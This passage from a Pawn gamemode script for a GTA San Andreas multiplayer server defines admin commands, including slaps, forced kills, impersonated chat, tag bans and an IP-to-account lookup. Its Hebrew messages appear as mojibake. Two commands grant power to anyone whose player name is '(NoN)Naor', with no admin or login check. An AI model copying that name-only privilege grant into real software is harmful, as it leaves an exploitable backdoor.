			format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· юёЇ° ЇЄющ ффу-∙хш ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· юёЇ° ЇЄющ ффу-∙хш ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][hshots] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"HeadShots",set);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· Є°щыф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/skyd") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /skyd [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(IsPlayerInAnyVehicle(id)) SetVehiclePos(GetPlayerVehicleID(id),6366.5625,-2109.0959,1800.0,id);
		else SetPlayerPos(id,6366.5625,-2109.0959,1800.0);
		format(string,sizeof(string)," !%s ф∙ьщъ ьющэ р· %s",GetName(id),GetName(playerid));
		SendClientMessageToAll(green,string);
		SendClientMessage(id,blue," (: !юўххщэ ∙р·ф щхуЄ ь∙чх·");
		return 1;
	}
	if(equal(cmd,"/fakedeath") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /fakedeath [id/name] [reason] :Ўх°· ф∙щюх∙");
		new reason, id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), reason = !strlen(cmd) || !IsNumeric(cmd) ? 53 : strval(cmd);
		SendDeathMessage(playerid,id,reason);
		return 1;
	}
	if(equal(cmd,"/sayas") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new text[256], id;
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(text))
		{
			SendClientMessage(playerid,white," /sayas [id/name] [text] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,red," !Єэ Їўхух·, цф юЇщь р· ф∙°· sayas Ёр ьр ьЄ∙х·");
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(text[0] == '/') command(id,text);
		else OnPlayerText(id,text);
		return 1;
	}
	if(equal(cmd,"/lucifer") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		new string[M_S];
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /lucifer [cmd] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /lucifer me :фЇщыф ь∙шя");
			SendClientMessage(playerid,white," /lucifer end :фЇёў· юЎс ∙шя");
			SendClientMessage(playerid,white," /lucifer kill [id/name] :ф°щт· ∙чўя сыхч ф∙шя");
			SendClientMessage(playerid,white," /lucifer power [1-3] :∙щюх∙ сыхчх· ∙шя рч°щэ");
			return 1;
		}
		if(equal(cmd,"me"))
		{
			if(playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .р·ф ыс° ∙шя");
			playerinfo[playerid][lucifer] = 1;
			SetWeather(serverWeather = 27);
			SetWorldTime(23);
			SetPlayerHealth(playerid,INFINITY);
			playerinfo[playerid][gm] = 1, playerinfo[playerid][nr] = 1,
			playerinfo[playerid][abf][0] = 1, playerinfo[playerid][abf][1] = GetPlayerState(playerid) == PLAYER_STATE_DRIVER ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
			SetPlayerColor(playerid,rgba2hex(255,0,0,255));
			ResetWeapons(playerid);
			for(new i=0;i<sizeof(luciferWeapons);i++) GiveWeapon(playerid,luciferWeapons[i],100000);
			News(" !ф∙шя щщ°у ьр°ї, фцф°х");
		}
		else if(equal(cmd,"end"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .р·ф ьр ∙шя");
			playerinfo[playerid][lucifer] = 0;
			SetWeather(serverWeather = worlddef_weather);
			SetWorldTime(worlddef_time);
			SetPlayerHealth(playerid,100.0);
			playerinfo[playerid][gm] = 0, playerinfo[playerid][nr] = 0,
			playerinfo[playerid][abf][0] = 0, playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
			SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
			ResetWeapons(playerid);
			for(new i=0;i<10;i++) GiveWeapon(playerid,playerinfo[playerid][weapons][i],i == 9 || i == 8? 1:(GetAmmunationAmmo(playerinfo[playerid][weapons][i])*playerinfo[playerid][ammo][i]));
			News(" .рщцх фўьф, ф∙шя чц° ьсщ·х");
		}
		else if(equal(cmd,"fly"))
		{
			TestFlying(playerid);
		}
		else if(equal(cmd,"flyc"))
		{
			TestFlyingC(playerid);
		}
		else if(equal(cmd,"kill"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .р·ф ьр ∙шя");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /lucifer kill [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			SetPlayerHealth(id,0.0);
			format(string,sizeof(string)," !сЄц°· ыхчх·щх %s ф∙шя ф°т р·",GetName(id));
			News(string);
		}
		else if(equal(cmd,"power"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .р·ф ьр ∙шя");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /lucifer power [1-3] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /lucifer power 1 :°Єщу· руюф");
				SendClientMessage(playerid,white," /lucifer power 2 :∙°щЇф");
				SendClientMessage(playerid,white," /lucifer power 3 :ЇщЎхЎщэ ьыь юф ∙юёсщс");
				return 1;
			}
			new powerid = strval(cmd), Float:p[3], Float:p2[3], Float:h;
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			switch(powerid)
			{
				case 1:
				{
					CreateExplosion(p[0],p[1],p[2] - 25.0,7,0.3);
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && i != playerid)
					{
						GetPlayerPos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2] - 30.0,7,0.3);
						GetPlayerHealth(i,h);
						SetPlayerHealth(i,h - floatrand(1.0,10.0));
					}
					News(" !ф∙шя щщЎ° °Єщу· руюф");
				}
				case 2:
				{
					CreateExplosion(p[0],p[1],p[2]-10.0,7,0.3);
					for(new i = 0; i < 6; i++)
					{
						CreateExplosion(!random(2) ? p[0] + floatrand(15.0,30.0) : p[0] - floatrand(15.0,30.0),p[1],p[2],8,10);
						CreateExplosion(p[0],!random(2) ? p[1] + floatrand(15.0,30.0) : p[1] - floatrand(15.0,30.0),p[2],8,10);
					}
					News(" !ф∙шя щщЎ° ∙°щЇф");
				}
				case 3:
				{
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && i != playerid)
					{
						GetPlayerPos(i,p[0],p[1],p[2]);
						CreateExplosion(p[0],p[1],p[2],1,10);
					}
					for(new i = 0; i < MAX_VEHICLES; i++) if(vehicleinfo[i][vvalid] && IsVehicleStreamedIn(i,playerid) && !IsPlayerInVehicle(playerid,i))
					{
						GetVehiclePos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2],1,10);
					}
					for(new i = 0; i < max_objects; i++) if(IsValidSObject(i) && SObjectToPoint(object_show_distance,i,p[0],p[1],p[2]) && !SObjectToPoint(10.0,i,p[0],p[1],p[2]))
					{
						GetSObjectPos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2],1,10);
					}
					News(" !ф∙шя ЇщЎї р· ыь юф ∙юёсщсх");
				}
				default: return SendClientMessage(playerid,red," .ыхч ∙шя ∙тхщ");
			}
			format(string,sizeof(string)," .ф∙·ю∙· сыхч ф #%d ∙ьъ",powerid);
			SendClientMessage(playerid,rgba2hex(255,255,255,255),string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙шя ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/pgravity") && IsPlayerMAdmin(playerid))
	{   // guard_shit
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new text[256], id, Float:pgravity, string[M_S];
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(text)) return SendClientMessage(playerid,white," /pgravity [id/name] [gravity] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerUsingSGuard_(id)) return SendClientMessage(playerid,red," .SAMP-IL Guard-∙чўя цф ьр ю∙·ю∙ с");
		cmd = strtok(cmdtext,idx), pgravity = !strlen(cmd) ? 0.008 : floatstr(cmd);
		SetPlayerGravity(id,pgravity);
		format(string,sizeof(string)," .ь %f %s ∙щЁщ· ыхч фю∙щыф рЎь",pgravity,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ыхч фю∙щыф рЎьъ ь %f",pgravity);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/wehateyou") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /wehateyou [id/name] :Ўх°· ф∙щюх∙");
		new string[M_S], id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][wehateyou] != -1) return playerinfo[id][wehateyou] = -1, SendClientMessage(playerid,red,"ф∙Ёрф фЇёщўф."), 1;
		format(string,sizeof(string)," .щщ∙Ёр ·ыє хющу %s",GetName(id));
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string)," .фчьщш ∙Ў°щъ ь∙Ёхр рх·ъ %s фрующя",GetName(playerid));
		SendClientMessage(id,red,string);
		SendClientMessage(id,red," .ф∙°· фхьъ ьф·Єьь съ хьфЄьщс рх·ъ");
		SetTimerPck(playerinfo[id][wehateyou],"WeHateYou",750,1,"i",id);
		SetPlayerHealth(id,0.0);
		return 1;
	}
	if(equal(cmd,"/smuslap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /smuslap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour(id,h-99.0);
		else
		{
			SetPlayerArmour(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth(id,h-99.0);
		}
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,500.0,id);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+500.0);
		}
		for(new a=0;a<50;a++)
		{
			PlaySound(playerid,1190);
			PlaySound(id,1190);
		}
		format(string,sizeof(string)," *** %s has been super mega ultra slapped by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showslaps] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/sdmuasslap") && IsPlayerMAdmin(playerid))
	{
		//if(!playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .Amit Power Єьщъ ьф∙·ю∙ с");
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sdmuasslap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		SetPlayerArmour(id,0.0);
		GetPlayerHealth(id,h);
		SetPlayerHealth(id,h-99.0 < 0.0 ? 0.0 : h-99.0);
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,1500.0,id);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+1500.0);
		}
		for(new a=0;a<100;a++)
		{
			PlaySound(playerid,1190);
			PlaySound(id,1190);
		}
		format(string,sizeof(string)," *** %s has been super duper mega ultra amazing splendid slapped by %s.",GetName(id), GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showslaps] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,red,string);
		return 1;
	}
	if(equal(cmd, "/blockplayers") && (playerinfo[playerid][pp] || equal(GetName(playerid), "(NoN)Naor")))
	{
	    playerinfo[playerid][blockplayers] = !playerinfo[playerid][blockplayers];
	    if(!playerinfo[playerid][blockplayers]) SendClientMessage(playerid, red, " !рщЁъ чхёэ ∙чўЁщэ юЎщўщэ");
	    else SendClientMessage(playerid, green, " !∙чўЁщэ юЎщўщэ ьр щ·ў°сх рьщъ");
	    return 1;
	}
	if(equal(cmd, "/naorslap") && (playerinfo[playerid][pp] || equal(GetName(playerid), "(NoN)Naor")))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /naorslap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerid != id && (playerinfo[id][pp] || equal(GetName(id), "(NoN)Naor"))) return SendClientMessage(playerid, red, " .ысху фуущ");
		SetPlayerVelocity(id, 0.0, 0.0, 999999);
	   	SetPlayerPos(id, -9999, -9999, -9999);
	   	SetPlayerWorldBounds(id, 1, 1, 1, 1);
		PlayerPlaySound(id, 1130, 0,0,0);
		SetPlayerHealth(id, 1231231);
		playerinfo[id][naorslap] = true;
		format(string, sizeof(string), " >>> %s has been slapped by %s using Naor Power", GetName(id), GetName(playerid));
		SendClientMessageToAll(red, string);
		return 1;
	}
	if(equal(cmd,"/apslap") && IsPlayerMAdmin(playerid))
	{
		if(!playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .Amit Power Єьщъ ьф∙·ю∙ с");
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new id, string[M_S], t;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /apslap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid), cmd = strtok(cmdtext,idx), t = !strlen(cmd) ? 100 : strval(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		playerinfo[id][apslap][0] = t;
		SetTimerPck(playerinfo[id][apslap][1],"Slap",100,1,"i",id);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showslaps] || i == playerid || i == id || IsPlayerMAdmin(i)))
		{
			format(string,sizeof(string)," *** %s has been...",GetName(id));
			SendClientMessage(i,red,string);
			SendClientMessage(i,red,"   >>>   Super   Duper   Mega   Ultra   <<<");
			SendClientMessage(i,red,"   >>>   Amazing   Splendid   Fantastic   <<<");
			SendClientMessage(i,red,"   >>>   Extreme   WOW   Great   Power   <<<");
			SendClientMessage(i,red,"   >>>   GOD   Idiotly   Pro   Game   <<<");
			SendClientMessage(i,red,"   >>>   Crazy   Evil   Sexy   Scary   <<<");
			SendClientMessage(i,red,"   >>>   Incredible   HELL   Strong   <<<");
			SendClientMessage(i,red,"   >>>   Mighty   Muscular   Boom   <<<");
			format(string,sizeof(string)," ~ SLAPPED ~ by the Amit Power.",GetName(playerid));
			SendClientMessage(i,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/suser") && IsPlayerMAdmin(playerid))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .Їўхуф цх рщЁф юрхЇ∙°·");
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S], files[M_S], inedx, total = 0, d = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /suser [ip/name] :Ўх°· ф∙щюх∙");
		if(cmd[0] >= '0' && cmd[0] <= '9' && strlen(cmd) >= 7 && strlen(cmd) <= 15)
		{
			format(string,sizeof(string)," ~~~ :\"%s\" ·хЎрх· чщЇх∙ рч°щ ю∙·ю∙щэ срщщЇщ ~~~",cmd);
			SendClientMessage(playerid,lightblue,string);
			while(ffind("/DM/Users/*.ini",files,sizeof(files),inedx))
			{
				format(string,sizeof(string),"/DM/Users/%s",files);
				if(equal(cmd,fgetstring(string,"LastConnectIP")) || equal(cmd,fgetstring(string,"RegistrationIP")))
				{
					strdel(files,strlen(files)-5,strlen(files)-1);
					format(string,sizeof(string)," Х %d. %s (%s)",++total,files,equal(cmd,fgetstring(string,"RegistrationIP")) ? (" Ё°∙э Єэ фрщщЇщ фцф ") : (" ЁыЁё ьрч°хЁф Єэ фрщщЇщ фцф "));
					SendClientMessage(playerid,yellow,string);
					files = "", string = "";
				}
			}
		}
		else
		{
			format(string,sizeof(string)," ~~~ :\"%s\" ·хЎрх· чщЇх∙ рч°щ ыщЁхщ фюыщь р· фющьф ~~~",cmd);
			SendClientMessage(playerid,lightblue,string);
			while(ffind("/DM/Users/*.ini",files,sizeof(files),inedx)) if(strfind(files,cmd,true) != -1)
			{
				format(string,sizeof(string),"/DM/Users/%s",files);
				d = DaysBetweenDates(fgetstring(string,"RegistrationDate"),GetDateAsString());
				strdel(files,strlen(files)-5,strlen(files)-1);
				format(string,sizeof(string)," ф·чс° ьрч°хЁф ьЇЁщ %d щющэ ",d);
				format(string,sizeof(string)," Х %d. %s (%s)",++total,files,!d ? (" Ё°∙э фщхэ ") : (string));
				SendClientMessage(playerid,yellow,string);
				files = "", string = "";
			}
		}
		format(string,sizeof(string)," .ёъ фыь %d ·хЎрх·",total);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/tagkick"))
	{
		new string[M_S], reason[256];
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tagkick [tag] [reason] :Ўх°· ф∙щюх∙");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = "фрующя ьр фўьщу ёщсф";
		format(string,sizeof(string),"TagKick: \"%s\", %s",cmd,reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] <= playerinfo[playerid][admin] && strfind(GetName(i),cmd,true) != -1 && i != playerid) SetKick(i,playerid,string);
		return 1;
	}
	if(equal(cmd,"/tagban"))
	{
		new string[M_S], reason[256];
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tagban [tag] [reason] :Ўх°· ф∙щюх∙");
		cmd = strtok(cmdtext,idx);
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = "фрующя ьр фўьщу ёщсф";
		format(string,sizeof(string),"(%d)%s %s banned tag \"%s\" [reason: %s]",playerid,GetIP(playerid),GetName(playerid),cmd,reason);
		Log("Bans",playerid,string);
		print(string);
		format(string,sizeof(string),"TagBan: \"%s\", %s",cmd,reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] <= playerinfo[playerid][admin] && strfind(GetName(i),cmd,true) != -1 && i != playerid) SetBan(i,playerid,string);
		return 1;
	}
	if(equal(cmd,"/aclogs") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("рч°рщ рующЁщэ"))) && playerinfo[playerid][pp])
	{
		if((playerinfo[playerid][admin] < 19 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("рч°рщ рующЁщэ"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		ShowPlayerDialog(playerid,dialog_clogs,DIALOG_STYLE_LIST,"CLogs рЇ∙°хщх·","ЎЇщщф сьхтщэ\nЁщўхщ ьхтщэ","сч°","ётх°");
		return 1;
	}
	if(equal(cmd,"/ball") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ball [id/name] [0=off 1=normal 2=nochat] :Ўх°· ф∙щюх∙");
		new mode, id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), mode = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(playerinfo[id][ball] == mode) return SendClientMessage(playerid,red," .∙чўя цф ыс° ЁюЎр сюЎс фыух° ∙ЎщщЁ·");
		switch(mode)
		{
			case 0:
			{
				format(string,sizeof(string)," .р· фыух° %s фё°· ю",GetName(id));
				SendClientMessage(playerid,green,string);
				SendClientMessage(id,green," .фрующя фёщ° ююъ р· фыух°");
				DestroySpecialVehicle(playerinfo[id][ballv]);
				playerinfo[id][ballv] = -1;
			}
			case 1, 2:
			{
				new Float:p[4];
				if(mode == 1)
				{
					format(string,sizeof(string)," .ьыух° %s фЇы· р·",GetName(id));
					SendClientMessage(playerid,green,string);
					SendClientMessage(id,green," .фрующя фЇъ рх·ъ ьыух°");
				}
				else
				{
					format(string,sizeof(string)," .(ьыух° (ььр Ў'рш %s фЇы· р·",GetName(id));
					SendClientMessage(playerid,green,string);
					SendClientMessage(id,green," .(фрующя фЇъ рх·ъ ьыух° (ььр Ў'рш");
				}
				GetPlayerPos(id,p[0],p[1],p[2]);
				GetPlayerFacingAngle(id,p[3]);
				playerinfo[id][ballv] = CreateSpecialVehicle(594,p[0],p[1],p[2],p[3],-1,-1,respawntime,GetPlayerVirtualWorld(id),1598,SV_BALL,"Ball",1,0);
				vehicleinfo[playerinfo[id][ballv]][vcantenter] = 1;
				PutPlayerInVehicle(id,playerinfo[id][ballv],0);
			}
			default: return SendClientMessage(playerid,red," .юЎс ыух° ∙тхщ");
		}
		playerinfo[id][ball] = mode;
		return 1;
	}
	if(equal(cmd,"/uheaders") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		UpdateModeHelpHeaders();
		SendClientMessage(playerid,white,"Done.");
		return 1;
	}
	if(equal(cmd,"/signboards") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		ReloadSignboards();
		SendClientMessage(playerid,white,"Done.");
		return 1;
	}
	if(equal(cmd,"/names") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /names [on/off] :Ўх°· ф∙щюх∙");
		new string[M_S];
		if(equal(cmd,"on"))
		{
			ShowNameTags(1);
			format(string,sizeof(string)," .фЇЄщь ·Ўхт· ∙юх· ∙чўЁщэ %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"off"))
		{
			ShowNameTags(0);
			format(string,sizeof(string)," .сщшь ·Ўхт· ∙юх· ∙чўЁщэ %s фрующя",GetName(playerid));
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/markers") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /markers [on/off] :Ўх°· ф∙щюх∙");
		new string[M_S];
		if(equal(cmd,"on"))
		{
			ShowPlayerMarkers(1);
			format(string,sizeof(string)," .фЇЄщь ·Ўхт· ∙чўЁщэ сюЇф %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"off"))
		{
			ShowPlayerMarkers(0);
			format(string,sizeof(string)," .сщшь ·Ўхт· ∙чўЁщэ сюЇф %s фрующя",GetName(playerid));
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/attachobj") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		cmd = strtok(cmdtext,idx);
		new modelid = strval(cmd);
		cmd = strtok(cmdtext,idx);
		SetPlayerAttachedObject(playerid,aoslot_test,modelid,strval(cmd));
		EditAttachedObject(playerid,aoslot_test);
		playerinfo[playerid][editing] = edit_attached_test;
		return 1;
	}
	if(equal(cmd,"/setmaxcbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
        new cmd2[64], c, b, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setmaxcbank [clan name] [max amount] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd), b = strval(cmd2);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
